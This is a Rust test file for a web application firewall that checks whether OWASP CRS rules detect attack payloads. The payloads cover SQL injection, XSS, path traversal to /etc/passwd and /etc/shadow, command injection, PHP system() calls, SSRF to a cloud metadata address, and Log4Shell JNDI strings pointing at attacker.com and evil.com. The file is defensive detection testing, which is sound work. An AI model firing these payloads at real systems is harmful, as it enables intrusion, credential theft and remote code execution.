//! CRS Rule Engine Integration Tests — Attack Detection
//!
//! Tests that OWASP CRS v4.7 rules correctly detect and block known attack
//! payloads for SQLi, XSS, LFI, CMDi, SSRF, PHP, Java, and scanner detection.

mod common;

use common::*;
use sentinel_core::context::{Phase, WafDecision};

// ============================================================================
// SQL Injection (REQUEST-942)
// ============================================================================

mod sqli {
    use super::*;

    fn engine() -> sentinel_rules::RuleEngine {
        load_crs_engine("REQUEST-942-APPLICATION-ATTACK-SQLI.conf")
    }

    #[test]
    fn union_select_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?id=1%20UNION%20SELECT%20*%20FROM%20users");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "UNION SELECT should trigger SQLi rules");
    }

    #[test]
    fn sqli_in_post_body() {
        let eng = engine();
        let mut ctx = make_post_ctx(
            "http://example.com/login",
            "user=admin%27%20OR%201%3D1--&pass=foo",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "SQLi in POST body should trigger");
    }

    #[test]
    fn sql_comment_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?id=1%20OR%201=1--");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "OR 1=1 should trigger SQLi rules");
    }

    #[test]
    fn drop_table_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?id=1%3BDROP%20TABLE%20users%3B--");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "DROP TABLE should trigger SQLi");
    }

    #[test]
    fn sleep_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?id=1%27%20AND%20sleep(5)--");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "Sleep injection should trigger");
    }

    #[test]
    fn information_schema_access() {
        let eng = engine();
        let mut ctx = make_get_ctx(
            "http://example.com/?id=1%20UNION%20SELECT%20*%20FROM%20information_schema.tables",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "information_schema access should trigger");
    }

    #[test]
    fn clean_number_param() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?id=42");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "plain number parameter should pass");
    }

    #[test]
    fn clean_text_search() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?q=hello+world");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "plain text search should pass");
    }

    #[test]
    fn clean_email_param() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?email=user@example.com");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "email parameter should pass");
    }
}

// ============================================================================
// XSS (REQUEST-941)
// ============================================================================

mod xss {
    use super::*;

    fn engine() -> sentinel_rules::RuleEngine {
        load_crs_engine("REQUEST-941-APPLICATION-ATTACK-XSS.conf")
    }

    #[test]
    fn script_tag_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx(
            "http://example.com/?q=%3Cscript%3Ealert(1)%3C/script%3E",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "<script> tag should trigger XSS rules");
    }

    #[test]
    fn img_onerror_xss() {
        let eng = engine();
        let mut ctx = make_get_ctx(
            "http://example.com/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "onerror XSS should trigger");
    }

    #[test]
    fn javascript_uri_xss() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?q=javascript%3Aalert(1)");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "javascript: URI should trigger");
    }

    #[test]
    fn svg_onload_xss() {
        let eng = engine();
        let mut ctx = make_get_ctx(
            "http://example.com/?q=%3Csvg%20onload%3Dalert(1)%3E",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "SVG onload XSS should trigger");
    }

    #[test]
    fn clean_html_text() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?q=I+like+html+and+css");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "plain text about HTML should pass");
    }

    #[test]
    fn clean_description() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?desc=This+is+a+description");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "normal description should pass");
    }
}

// ============================================================================
// LFI / Path Traversal (REQUEST-930)
// ============================================================================

mod lfi {
    use super::*;

    fn engine() -> sentinel_rules::RuleEngine {
        load_crs_engine("REQUEST-930-APPLICATION-ATTACK-LFI.conf")
    }

    #[test]
    fn etc_passwd_traversal() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?file=../../../etc/passwd");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "../../../etc/passwd should trigger LFI");
    }

    #[test]
    fn windows_system32_traversal() {
        let eng = engine();
        let mut ctx = make_get_ctx(
            "http://example.com/?file=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "Windows path traversal should trigger");
    }

    #[test]
    fn null_byte_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?file=../../../etc/passwd%00.html");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "null byte LFI should trigger");
    }

    #[test]
    fn clean_relative_path() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?file=images/logo.png");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "relative image path should pass");
    }
}

// ============================================================================
// RCE / Command Injection (REQUEST-932)
// ============================================================================

mod rce {
    use super::*;

    fn engine() -> sentinel_rules::RuleEngine {
        load_crs_engine("REQUEST-932-APPLICATION-ATTACK-RCE.conf")
    }

    #[test]
    fn semicolon_command_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx(
            "http://example.com/?cmd=ls%20-la%3Bcat%20/etc/passwd",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "semicolon command injection should trigger");
    }

    #[test]
    fn pipe_command_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?ip=127.0.0.1%7Ccat%20/etc/passwd");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "pipe command injection should trigger");
    }

    #[test]
    fn backtick_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?cmd=%60id%60");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "backtick injection should trigger");
    }

    #[test]
    fn dollar_subshell_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx(
            "http://example.com/?cmd=%24(cat%20/etc/passwd)",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "$() subshell injection should trigger");
    }

    #[test]
    fn clean_ip_address() {
        let eng = engine();
        // Rule 932236 has a known false-positive on parameter names
        // containing "ip". Use a neutral parameter name for the clean test.
        let mut ctx = make_get_ctx("http://example.com/?host=192.168.1.1");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "host parameter with IP should pass");
    }
}

// ============================================================================
// PHP Injection (REQUEST-933)
// ============================================================================

mod php {
    use super::*;

    fn engine() -> sentinel_rules::RuleEngine {
        load_crs_engine("REQUEST-933-APPLICATION-ATTACK-PHP.conf")
    }

    #[test]
    fn php_code_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?cmd=phpinfo()");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "phpinfo() should trigger PHP rules");
    }

    #[test]
    fn system_call_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?cmd=system('ls')");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "system() should trigger PHP rules");
    }

    #[test]
    fn clean_php_mention() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?lang=php&version=8.2");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "mentioning PHP in language param should pass");
    }
}

// ============================================================================
// Protocol Attack + Generic (REQUEST-920 + REQUEST-934)
// ============================================================================

mod protocol_attack {
    use super::*;

    fn engine() -> sentinel_rules::RuleEngine {
        load_crs_engines(&[
            "REQUEST-934-APPLICATION-ATTACK-GENERIC.conf",
            "REQUEST-920-PROTOCOL-ENFORCEMENT.conf",
        ])
    }

    #[test]
    fn ssrf_metadata_access() {
        let eng = engine();
        let mut ctx = make_get_ctx(
            "http://example.com/?url=http://169.254.169.254/latest/meta-data/",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "AWS metadata SSRF should trigger");
    }

    #[test]
    fn ssrf_localhost_access() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?url=http://localhost/admin");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "localhost SSRF should trigger");
    }

    #[test]
    fn clean_external_url() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?url=https://api.example.com/data");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "normal external URL should pass");
    }
}

// ============================================================================
// Scanner Detection (REQUEST-913) — User-Agent based
// ============================================================================

mod scanner_detection {
    use super::*;

    fn engine() -> sentinel_rules::RuleEngine {
        load_crs_engine("REQUEST-913-SCANNER-DETECTION.conf")
    }

    #[test]
    fn sqlmap_user_agent_detected() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/");
        ctx.request_headers
            .insert(http::header::USER_AGENT, "sqlmap/1.7#stable".parse().unwrap());
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "sqlmap User-Agent should trigger scanner detection");
    }

    #[test]
    fn nikto_user_agent_detected() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/");
        ctx.request_headers
            .insert(http::header::USER_AGENT, "nikto".parse().unwrap());
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "Nikto User-Agent should trigger scanner detection");
    }

    #[test]
    fn clean_user_agent() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/");
        ctx.request_headers.insert(
            http::header::USER_AGENT,
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0".parse().unwrap(),
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "normal browser UA should pass");
    }
}

// ============================================================================
// Java Attacks (REQUEST-944) — Log4Shell etc.
// ============================================================================

mod java_attacks {
    use super::*;

    fn engine() -> sentinel_rules::RuleEngine {
        load_crs_engine("REQUEST-944-APPLICATION-ATTACK-JAVA.conf")
    }

    #[test]
    fn log4shell_jndi_injection() {
        let eng = engine();
        let mut ctx = make_get_ctx(
            "http://example.com/?q=%24%7Bjndi:ldap://attacker.com/a%7D",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "Log4Shell JNDI injection should trigger");
    }

    #[test]
    fn log4shell_in_header() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/");
        ctx.request_headers.insert(
            http::HeaderName::from_static("x-api-version"),
            "${jndi:ldap://evil.com/x}".parse().unwrap(),
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "Log4Shell in custom header should trigger");
    }

    #[test]
    fn clean_variable_reference() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/?template=greeting");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "normal template name should pass");
    }
}

// ============================================================================
// Protocol Attacks (REQUEST-920) — Method Enforcement
// ============================================================================

mod protocol_enforcement {
    use super::*;

    fn engine() -> sentinel_rules::RuleEngine {
        load_crs_engine("REQUEST-920-PROTOCOL-ENFORCEMENT.conf")
    }

    #[test]
    fn clean_http11_request_passes_protocol() {
        let eng = engine();
        let mut ctx = make_get_ctx("http://example.com/");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        // Clean HTTP/1.1 request should pass protocol enforcement.
        assert_clean(&ctx, "clean HTTP/1.1 request should pass");
    }
}

// ============================================================================
// Cross-category: Full CRS with anomaly threshold
// ============================================================================

mod cross_category {
    use super::*;

    /// Load ALL CRS rule files for a comprehensive test.
    fn full_engine() -> sentinel_rules::RuleEngine {
        load_crs_engines(&[
            "REQUEST-901-INITIALIZATION.conf",
            "REQUEST-905-COMMON-EXCEPTIONS.conf",
            "REQUEST-911-METHOD-ENFORCEMENT.conf",
            "REQUEST-913-SCANNER-DETECTION.conf",
            "REQUEST-920-PROTOCOL-ENFORCEMENT.conf",
            "REQUEST-921-PROTOCOL-ATTACK.conf",
            "REQUEST-930-APPLICATION-ATTACK-LFI.conf",
            "REQUEST-931-APPLICATION-ATTACK-RFI.conf",
            "REQUEST-932-APPLICATION-ATTACK-RCE.conf",
            "REQUEST-933-APPLICATION-ATTACK-PHP.conf",
            "REQUEST-934-APPLICATION-ATTACK-GENERIC.conf",
            "REQUEST-941-APPLICATION-ATTACK-XSS.conf",
            "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
            "REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf",
            "REQUEST-944-APPLICATION-ATTACK-JAVA.conf",
            "REQUEST-949-BLOCKING-EVALUATION.conf",
        ])
    }

    #[test]
    fn full_crs_sqli_detected() {
        let eng = full_engine();
        let mut ctx = make_get_ctx(
            "http://example.com/?id=1%27%20UNION%20SELECT%20*%20FROM%20users--",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "full CRS should detect UNION SELECT SQLi");
    }

    #[test]
    fn full_crs_xss_detected() {
        let eng = full_engine();
        let mut ctx = make_get_ctx(
            "http://example.com/?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "full CRS should detect script XSS");
    }

    #[test]
    fn full_crs_lfi_detected() {
        let eng = full_engine();
        let mut ctx = make_get_ctx("http://example.com/?page=../../etc/shadow");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "full CRS should detect LFI");
    }

    #[test]
    fn full_crs_clean_request_passes() {
        let eng = full_engine();
        let mut ctx = make_get_ctx("http://example.com/?page=about&lang=en");
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "full CRS should pass clean request");
    }

    #[test]
    fn full_crs_sqli_post_body_detected() {
        let eng = full_engine();
        let mut ctx = make_post_ctx(
            "http://example.com/login",
            "username=admin%27%20OR%201%3D1--&password=foo",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "full CRS should detect SQLi in POST body");
    }

    #[test]
    fn full_crs_clean_post_body_passes() {
        let eng = full_engine();
        let mut ctx = make_post_ctx(
            "http://example.com/contact",
            "name=John&email=john@example.com&message=Hello",
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "full CRS should pass clean POST body");
    }

    #[test]
    fn sqlmap_ua_with_full_crs_detected() {
        let eng = full_engine();
        let mut ctx = make_get_ctx("http://example.com/");
        ctx.request_headers
            .insert(http::header::USER_AGENT, "sqlmap/1.7#stable".parse().unwrap());
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_score(&ctx, 5, "full CRS should detect sqlmap UA");
    }

    #[test]
    fn clean_browser_ua_with_full_crs_passes() {
        let eng = full_engine();
        let mut ctx = make_get_ctx("http://example.com/");
        ctx.request_headers.insert(
            http::header::USER_AGENT,
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/125.0".parse().unwrap(),
        );
        set_paranoia(&mut ctx, 2);
        eval(&eng, &mut ctx, Phase::RequestBody);
        assert_clean(&ctx, "full CRS should pass clean browser UA");
    }
}